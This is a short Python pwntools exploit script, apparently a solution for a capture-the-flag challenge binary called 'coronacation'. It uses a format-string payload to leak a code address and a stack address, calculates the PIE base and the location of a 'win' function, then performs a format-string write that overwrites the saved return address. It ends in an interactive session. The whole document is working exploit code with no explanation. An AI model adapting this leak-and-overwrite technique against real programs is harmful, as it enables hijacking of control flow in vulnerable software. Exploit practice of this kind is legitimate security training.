#!/usr/bin/python 
from pwn import *
from koharin import *

context.log_level = 'debug'
p = process("./coronacation")
elf = ELF("./coronacation")
libc = elf.libc

pay = '1'
pay += '%p%10$p'

p.sendlineafter("out.", pay)

gdb.attach(p)
p.recvuntil("You chose: 1")
leak = int(p.recv(14), 16)
log.info("leak : "+hex(leak))
pie = leak - 0x23c3
log.info("PIE base : "+hex(pie))
win = pie + elf.symbols['win']

stack = int(p.recv(14), 16)
stack_ret = stack - 0x56


pay = fsb64(6, stack_ret, win, 1)
p.sendlineafter("plan.", pay)

p.interactive()
